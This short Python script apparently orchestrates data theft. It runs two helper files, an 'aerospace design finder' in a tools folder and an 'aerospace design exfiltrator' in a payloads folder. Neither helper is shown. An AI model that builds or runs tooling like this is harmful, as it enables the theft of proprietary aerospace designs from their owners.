import subprocess
import os

def main():
    # Run the aerospace design finder
    finder_path = os.path.join(os.path.dirname(__file__), "tools", "aerospace_design_finder.py")
    subprocess.run(["python3", finder_path])

    # Run the aerospace design exfiltrator
    exfiltrator_path = os.path.join(os.path.dirname(__file__), "payloads", "aerospace_design_exfiltrator.py")
    subprocess.run(["python3", exfiltrator_path])

if __name__ == "__main__":
    main()
